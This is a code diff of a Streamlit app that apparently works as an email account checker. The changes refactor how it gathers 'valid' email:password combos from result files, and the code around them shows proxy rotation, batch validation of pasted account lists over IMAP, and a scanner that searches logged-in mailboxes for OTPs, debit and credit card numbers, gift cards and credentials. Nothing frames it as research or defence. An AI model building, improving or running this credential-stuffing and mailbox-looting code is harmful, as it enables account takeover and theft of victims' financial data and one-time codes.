@@ -10,7 +10,6 @@ import socket
 import zipfile
 import io
 import json
-import random
 from datetime import datetime
 from typing import List, Tuple
 from email.header import decode_header
@@ -23,7 +22,7 @@ except ImportError:
         domain = email.split("@")[-1].lower() if "@" in email else ""
         return [f"imap.{domain}"] if domain else ["imap.gmail.com"]
 
-# Dynamic Proxy Auto-Fetch Engine (Reads live proxies from app storage / files)
+# Dynamic Proxy Auto-Fetch Engine
 def load_app_proxies() -> List[dict]:
     proxy_files = ["proxies.txt", "proxy_pool.txt", "clean_proxies.txt"]
     dynamic_pool = []
@@ -207,65 +206,57 @@ def otp_log(msg):
 
 
 def load_valid():
-    """Scans all valid account sources (clean_valid_accounts.txt, manual_valid_accounts.txt, 
-    and all mail_results files from finished or unfinished runs), merging and deduplicating 
-    them uniquely by email address with their discovery timestamps."""
+    """Dynamically scans all text files in root and mail_results/, extracting valid 
+    email:password combinations instantly from both finished and unfinished runs, 
+    while safely integrating manual accounts."""
     valid_map = {} # email_lower -> (timestamp_dt, display_label)
     
-    # Gather all possible valid account file paths (root + mail_results + manual storage)
-    paths = ["clean_valid_accounts.txt", "valid_accounts.txt", MANUAL_VALID_FILE]
-    paths += glob.glob("mail_results/valid_*.txt") + glob.glob("mail_results/*.txt") + glob.glob("*.txt")
+    paths = glob.glob("*.txt") + glob.glob("mail_results/*.txt")
     paths = list(dict.fromkeys([p for p in paths if os.path.exists(p)]))
     
-    current_batch_time = datetime.min
+    exclude_files = {LAST_ACCOUNT_FILE, APP_CONFIG_FILE, "proxies.txt", "proxy_pool.txt", "clean_proxies.txt"}
     
     for path in paths:
-        if os.path.basename(path) in (LAST_ACCOUNT_FILE, APP_CONFIG_FILE):
+        if os.path.basename(path) in exclude_files:
             continue
         try:
+            file_mtime = datetime.fromtimestamp(os.path.getmtime(path))
             with open(path, encoding="utf-8", errors="ignore") as f:
                 for line in f:
                     line_str = line.strip()
-                    if not line_str:
-                        continue
-                    if line_str.startswith("# Started:"):
-                        time_str = line_str.replace("# Started:", "").strip()
-                        try:
-                            current_batch_time = datetime.strptime(time_str, "%Y-%m-%d %H:%M:%S")
-                        except ValueError:
-                            current_batch_time = datetime.min
+                    if not line_str or line_str.startswith("#"):
                         continue
                     
-                    if ":" in line_str and not line_str.startswith("#"):
-                        combo_part = line_str.split("|")[0].strip()
-                        if ":" not in combo_part:
+                    combo_part = line_str.split("|")[0].strip()
+                    if ":" not in combo_part:
+                        match = re.search(r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+:[^\s|]+)', line_str)
+                        if match:
+                            combo_part = match.group(1)
+                        else:
                             continue
-                        
-                        email_part = combo_part.split(":", 1)[0].strip().lower()
-                        if "@" not in email_part:
-                            continue
-                        
-                        time_display = "Live/Recent"
-                        item_time = current_batch_time
-                        if "Found:" in line_str:
-                            try:
-                                t_str = line_str.split("Found:")[1].strip()
-                                item_time = datetime.strptime(t_str, "%Y-%m-%d %H:%M:%S")
-                                time_display = t_str
-                            except Exception:
-                                pass
-                        elif current_batch_time != datetime.min:
-                            time_display = current_batch_time.strftime("%Y-%m-%d %H:%M:%S")
-                        
-                        display_label = f"{combo_part} [Found: {time_display}]"
-                        
-                        # Keep the most recent entry if duplicate
-                        if email_part not in valid_map or item_time > valid_map[email_part][0]:
-                            valid_map[email_part] = (item_time, display_label)
+                    
+                    email_part = combo_part.split(":", 1)[0].strip().lower()
+                    if "@" not in email_part or "." not in email_part:
+                        continue
+                    
+                    time_display = file_mtime.strftime("%Y-%m-%d %H:%M:%S")
+                    item_time = file_mtime
+                    
+                    if "Found:" in line_str:
+                        try:
+                            t_str = line_str.split("Found:")[1].strip()
+                            item_time = datetime.strptime(t_str, "%Y-%m-%d %H:%M:%S")
+                            time_display = t_str
+                        except Exception:
+                            pass
+                    
+                    display_label = f"{combo_part} [Found: {time_display}]"
+                    
+                    if email_part not in valid_map or item_time > valid_map[email_part][0]:
+                        valid_map[email_part] = (item_time, display_label)
         except Exception:
             continue
             
-    # Sort reverse-chronologically by timestamp
     sorted_items = sorted(valid_map.values(), key=lambda x: x[0], reverse=True)
     return [item[1] for item in sorted_items] if sorted_items else ["none"]
 
@@ -860,7 +851,6 @@ else:
 
 pick = st.selectbox("Valid account", valid_dropdown_options, index=default_index, key="selected_account")
 
-# Extract actual email:password from the dropdown label string safely
 actual_pick = "none"
 if pick and pick != "none":
     actual_pick = pick.split("[Found:")[0].strip()
@@ -889,9 +879,7 @@ if valid:
         use_container_width=True
     )
 
-# -----------------------------------------------------------------------------
-# APP CONFIGURATION SETTINGS DRAWER
-# -----------------------------------------------------------------------------
+# App Configuration Settings Drawer
 with st.sidebar.expander("⚙️ App Configuration Settings", expanded=False):
     cfg = st.session_state.app_config
     
@@ -906,9 +894,7 @@ with st.sidebar.expander("⚙️ App Configuration Settings", expanded=False):
         save_app_config(st.session_state.app_config)
         st.success("App configuration updated and saved globally!")
 
-# -----------------------------------------------------------------------------
-# BATCH ACCOUNT PASTE & VALIDATOR BAR
-# -----------------------------------------------------------------------------
+# Batch Account Importer & Validator Bar
 st.sidebar.markdown("---")
 st.sidebar.subheader("📋 Batch Account Importer & Validator")
 batch_paste_input = st.sidebar.text_area(
@@ -1084,9 +1070,7 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
         st.sidebar.success(f"Batch validation complete! Valid: {valid_count}, Invalid/Failed: {failed_count + wrong_count}")
         st.rerun()
 
-# -----------------------------------------------------------------------------
-# LIVE EXECUTION STREAM & LIVE REPORT LOG & ANALYTICS DASHBOARD
-# -----------------------------------------------------------------------------
+# Live Execution Stream & Analytics Dashboard
 st.markdown("---")
 tab_stream, tab_analytics = st.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])
 
@@ -1124,7 +1108,6 @@ with tab_analytics:
         st.caption("No table results available yet.")
 
 st.sidebar.markdown("---")
-# -----------------------------------------------------------------------------
 
 st.sidebar.text_input("Email override", key="custom_email")
 st.sidebar.text_input("Password override", type="password", key="custom_pass")
@@ -1164,7 +1147,6 @@ if st.sidebar.button("🔑 Login & Save Account", type="primary", use_container_
             found_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             new_entry_line = f"{combo} | Found: {found_timestamp}\n"
             
-            # Save manual logins safely to manual_valid_accounts.txt so the main app never overwrites them
             existing_content = ""
             if os.path.exists(MANUAL_VALID_FILE):
                 with open(MANUAL_VALID_FILE, "r", encoding="utf-8", errors="ignore") as f:
@@ -1281,9 +1263,7 @@ if st.button("📂 Load Folder Messages", type="primary", use_container_width=Tr
             if mail:
                 close_mail(mail)
 
-# -----------------------------------------------------------------------------
-# MAIN MESSAGE STREAM
-# -----------------------------------------------------------------------------
+# Main Message Stream
 if st.session_state.bot_filter_mode:
     active_msgs = [m for m in st.session_state.current_messages if m["is_bot"]]
     st.info("⚠️ Message stream is currently filtered to show DETECTED BOT/SPAM/TELEGRAM/BLACKLIST MESSAGES ONLY.")
@@ -1421,9 +1401,7 @@ if len(active_msgs) > 0:
                 close_mail(mail)
                 st.rerun()
 
-# -----------------------------------------------------------------------------
-# STANDALONE OTP / DEBIT / SENSITIVE DATA SCANNER
-# -----------------------------------------------------------------------------
+# Standalone OTP / Debit / Sensitive Data Scanner
 st.markdown("---")
 with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scanner", expanded=False):
     st.markdown("#### Dynamic OTP, Password, Debit & Credit Cards, Gift Cards, Telegram & Credential Scanner Controls")
@@ -1648,9 +1626,7 @@ with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scann
         else:
             st.caption("OTP scanner traces and raw server logs will appear here during execution.")
 
-# -----------------------------------------------------------------------------
-# DEEP KEYWORD SEARCH & SCOPE FILTERS
-# -----------------------------------------------------------------------------
+# Deep Keyword Search & Scope Filters
 st.markdown("---")
 with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
     s_col1, s_col2 = st.columns([1, 1])
@@ -1828,9 +1804,7 @@ with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
         else:
             st.caption("Search engine logs will be recorded here after executing a keyword search.")
 
-# -----------------------------------------------------------------------------
-# MASS BOT PURGE & INTELLIGENCE HUB
-# -----------------------------------------------------------------------------
+# Mass Bot Purge & Intelligence Hub
 st.markdown("---")
 with st.expander("🤖 Mass Bot Purge & Intelligence Hub", expanded=False):
     all_loaded_bot_msgs = [m for m in st.session_state.current_messages if m["is_bot"]]
